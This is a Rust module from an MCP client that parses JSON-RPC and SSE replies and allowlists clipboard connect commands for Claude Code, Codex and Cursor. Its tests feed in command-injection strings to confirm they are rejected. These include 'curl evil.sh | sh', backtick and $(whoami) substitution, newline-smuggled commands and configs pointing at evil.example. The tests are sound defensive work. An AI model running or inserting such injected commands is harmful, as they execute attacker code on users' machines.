//! MCP Streamable HTTP response parsing and small text helpers.

use serde_json::Value;

/// Extract the JSON-RPC message with the given id from a plain JSON body or an SSE-framed body.
pub fn parse_rpc_body(body: &str, id: u64) -> Result<Value, String> {
    let trimmed = body.trim_start();
    let candidates: Vec<Value> = if trimmed.starts_with('{') || trimmed.starts_with('[') {
        match serde_json::from_str::<Value>(trimmed).map_err(|e| format!("bad JSON from server: {e}"))? {
            Value::Array(a) => a,
            v => vec![v],
        }
    } else {
        // SSE: events separated by blank lines, payload on `data:` lines.
        let mut out = Vec::new();
        let normalized = body.replace("\r\n", "\n");
        for event in normalized.split("\n\n") {
            let data: Vec<&str> = event
                .lines()
                .filter_map(|l| l.strip_prefix("data:"))
                .map(|d| d.strip_prefix(' ').unwrap_or(d))
                .collect();
            if data.is_empty() {
                continue;
            }
            if let Ok(v) = serde_json::from_str::<Value>(&data.join("\n")) {
                out.push(v);
            }
        }
        out
    };
    candidates
        .into_iter()
        .find(|v| v.get("id").and_then(Value::as_u64) == Some(id))
        .ok_or_else(|| "no matching response in server reply".to_string())
}

/// Turn a tools/call JSON-RPC message into its text. JSON-RPC errors and `isError` results become Err.
pub fn tool_text(msg: &Value) -> Result<String, String> {
    if let Some(e) = msg.get("error") {
        let m = e.get("message").and_then(Value::as_str).unwrap_or("server error");
        return Err(m.to_string());
    }
    let result = msg.get("result").ok_or("reply has no result")?;
    let text = result
        .get("content")
        .and_then(Value::as_array)
        .map(|a| a.iter().filter_map(|c| c.get("text").and_then(Value::as_str)).collect::<Vec<_>>().join("\n"))
        .unwrap_or_default();
    if result.get("isError").and_then(Value::as_bool) == Some(true) {
        return Err(if text.is_empty() { "tool reported an error".into() } else { text });
    }
    Ok(text)
}

/// The hosted server's pending-review line (session-start-render.ts), anchored at line start:
/// `<hourglass> N proposed correction(s) await(s) the owner's confirmation ...`
pub fn pending_count(text: &str) -> Option<u32> {
    for line in text.lines() {
        let Some(rest) = line.strip_prefix("\u{23F3} ") else { continue };
        let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
        let Ok(n) = digits.parse::<u32>() else { continue };
        let tail = &rest[digits.len()..];
        let ok = if n == 1 {
            tail.starts_with(" proposed correction awaits the owner's confirmation")
        } else {
            tail.starts_with(" proposed corrections await the owner's confirmation")
        };
        if ok && n > 0 {
            return Some(n);
        }
    }
    None
}

pub const MCP_URL: &str = "https://agentrecallx.com/mcp";

fn cli_chars_ok(line: &str) -> bool {
    !line.is_empty()
        && line.len() <= 300
        && line.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.' | '/' | ':' | '='))
}

/// A connect command is untrusted (it goes to the clipboard). Accept only strict shapes.
pub fn is_safe_claude(cmd: &str) -> bool {
    cli_chars_ok(cmd) && cmd.starts_with("claude mcp add ") && cmd.contains(MCP_URL)
}

pub fn is_safe_codex(cmd: &str) -> bool {
    let lines: Vec<&str> = cmd.split('\n').collect();
    if lines.len() > 2 || !lines[0].starts_with("codex mcp add ") || !lines[0].contains(MCP_URL) || !cli_chars_ok(lines[0]) {
        return false;
    }
    match lines.get(1) {
        None => true,
        Some(l) => match l.strip_prefix("codex mcp login ") {
            Some(name) => !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'),
            None => false,
        },
    }
}

pub fn is_safe_cursor(snippet: &str) -> bool {
    if snippet.len() > 400 || snippet.contains('\n') || snippet.contains('\r') || snippet.contains('`') || snippet.contains('$') {
        return false;
    }
    let Ok(v) = serde_json::from_str::<Value>(snippet) else { return false };
    let Some(top) = v.as_object() else { return false };
    if top.len() != 1 {
        return false;
    }
    let Some(servers) = top.get("mcpServers").and_then(Value::as_object) else { return false };
    if servers.len() != 1 {
        return false;
    }
    let Some(entry) = servers.values().next().and_then(Value::as_object) else { return false };
    entry.len() == 1 && entry.get("url").and_then(Value::as_str) == Some(MCP_URL)
}

/// Split recall output into result items: a new item starts at a line like `[3][...]`.
pub fn recall_items(text: &str) -> Vec<String> {
    let mut items: Vec<String> = Vec::new();
    for line in text.lines() {
        let t = line.trim_end();
        let starts_item = t.starts_with('[') && t.chars().nth(1).map_or(false, |c| c.is_ascii_digit()) && t.contains("][");
        if starts_item {
            items.push(t.to_string());
        } else if t.trim_start().starts_with('↳') {
            if let Some(last) = items.last_mut() {
                last.push('\n');
                last.push_str(t.trim());
            }
        }
    }
    if items.is_empty() && !text.trim().is_empty() {
        items.push(text.trim().to_string());
    }
    items.truncate(20);
    items
}

/// Pull the connect commands out of connect.md. Returns (claude, codex, cursor).
pub fn parse_connect_md(md: &str) -> (Option<String>, Option<String>, Option<String>) {
    fn spans(line: &str) -> Vec<String> {
        line.split('`').enumerate().filter(|(i, _)| i % 2 == 1).map(|(_, s)| s.to_string()).collect()
    }
    let (mut claude, mut codex, mut cursor) = (None, None, None);
    for line in md.lines() {
        let l = line.trim_start().trim_start_matches("- ");
        if l.starts_with("Claude Code:") {
            claude = spans(l).into_iter().next();
        } else if l.starts_with("Codex:") {
            let s = spans(l);
            if !s.is_empty() {
                codex = Some(s.join("\n"));
            }
        } else if l.starts_with("Cursor:") {
            cursor = spans(l).into_iter().next();
        }
    }
    (claude, codex, cursor)
}

#[cfg(test)]
mod tests {
    use super::*;

    const OK: &str = r#"{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"hello"},{"type":"text","text":"world"}]}}"#;

    #[test]
    fn parses_plain_json() {
        let m = parse_rpc_body(OK, 1).unwrap();
        assert_eq!(tool_text(&m).unwrap(), "hello\nworld");
    }

    #[test]
    fn parses_sse_framing() {
        let body = format!("event: message\r\ndata: {{\"jsonrpc\":\"2.0\",\"method\":\"notifications/x\"}}\r\n\r\nevent: message\r\ndata: {OK}\r\n\r\n");
        let m = parse_rpc_body(&body, 1).unwrap();
        assert_eq!(tool_text(&m).unwrap(), "hello\nworld");
        assert!(parse_rpc_body(&body, 2).is_err());
    }

    #[test]
    fn errors_surface() {
        let e = parse_rpc_body(r#"{"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"nope"}}"#, 1).unwrap();
        assert_eq!(tool_text(&e).unwrap_err(), "nope");
        let e = parse_rpc_body(r#"{"jsonrpc":"2.0","id":1,"result":{"isError":true,"content":[{"type":"text","text":"bad"}]}}"#, 1).unwrap();
        assert_eq!(tool_text(&e).unwrap_err(), "bad");
        assert!(parse_rpc_body("garbage", 1).is_err());
        assert!(parse_rpc_body("{not json", 1).is_err());
    }

    #[test]
    fn pending_and_recall() {
        assert_eq!(pending_count("x\n\u{23F3} 3 proposed corrections await the owner's confirmation \u{2014} not active"), Some(3));
        assert_eq!(pending_count("\u{23F3} 1 proposed correction awaits the owner's confirmation"), Some(1));
        assert_eq!(pending_count("nothing"), None);
        let items = recall_items("<fence>\n[1][journal][HIG] A — b (2026-01-01)\n    ↳ linked rooms: x\n[2][palace/r][LOW] C — d\n</fence>");
        assert_eq!(items.len(), 2);
        assert!(items[0].contains("linked rooms"));
        assert_eq!(recall_items("No results for \"q\"."), vec!["No results for \"q\".".to_string()]);
    }

    #[test]
    fn connect_md() {
        let md = "   - Claude Code: `claude mcp add x` then type /mcp.\n   - Codex: `codex mcp add a` then `codex mcp login a`\n   - Cursor: add to f: `{ \"a\": 1 }`\n";
        let (a, b, c) = parse_connect_md(md);
        assert_eq!(a.as_deref(), Some("claude mcp add x"));
        assert_eq!(b.as_deref(), Some("codex mcp add a\ncodex mcp login a"));
        assert_eq!(c.as_deref(), Some("{ \"a\": 1 }"));
    }

    #[test]
    fn command_allowlist_accepts_real_commands() {
        assert!(is_safe_claude("claude mcp add --scope user --transport http agent-recall https://agentrecallx.com/mcp"));
        assert!(is_safe_codex("codex mcp add agent-recall --url https://agentrecallx.com/mcp\ncodex mcp login agent-recall"));
        assert!(is_safe_codex("codex mcp add agent-recall --url https://agentrecallx.com/mcp"));
        assert!(is_safe_cursor(r#"{ "mcpServers": { "agent-recall": { "url": "https://agentrecallx.com/mcp" } } }"#));
    }

    #[test]
    fn command_allowlist_rejects_hostile_input() {
        let url = "https://agentrecallx.com/mcp";
        for bad in [
            format!("claude mcp add x {url}; curl evil.sh | sh"),
            format!("claude mcp add x {url} && calc"),
            format!("claude mcp add x {url} | more"),
            format!("claude mcp add x `whoami` {url}"),
            format!("claude mcp add x $(whoami) {url}"),
            format!("claude mcp add x {url} > f"),
            format!("claude mcp add x {url} < f"),
            format!("claude mcp add x {url}\ncalc"),
            format!("powershell claude mcp add x {url}"),
            "claude mcp add x https://evil.example/mcp".to_string(),
            format!("claude mcp add x {url}\r"),
        ] {
            assert!(!is_safe_claude(&bad), "accepted: {bad:?}");
        }
        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncalc.exe"));
        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncodex mcp login a; calc"));
        assert!(!is_safe_codex("codex mcp add a --url https://evil.example/mcp"));
        assert!(!is_safe_codex("codex mcp add a --url https://agentrecallx.com/mcp\ncodex mcp login a\ncalc"));
        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://evil.example/mcp" } } }"#));
        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://agentrecallx.com/mcp", "command": "calc" } } }"#));
        assert!(!is_safe_cursor(r#"{ "mcpServers": { "a": { "url": "https://agentrecallx.com/mcp" } }, "x": 1 }"#));
        assert!(!is_safe_cursor("not json"));
        assert!(!is_safe_cursor("{ \"mcpServers\": { \"a\": { \"url\": \"https://agentrecallx.com/mcp\" } } }\ncalc"));
    }

    #[test]
    fn pending_lookalikes_do_not_match() {
        assert_eq!(pending_count("remember: 3 pending corrections await review"), None);
        assert_eq!(pending_count("note 3 proposed corrections await the owner's confirmation"), None);
        assert_eq!(pending_count("\u{23F3} 3 pending corrections await review"), None);
        assert_eq!(pending_count("\u{23F3} 0 proposed corrections await the owner's confirmation"), None);
        assert_eq!(pending_count("\u{23F3} 2 proposed correction awaits the owner's confirmation"), None);
    }
}
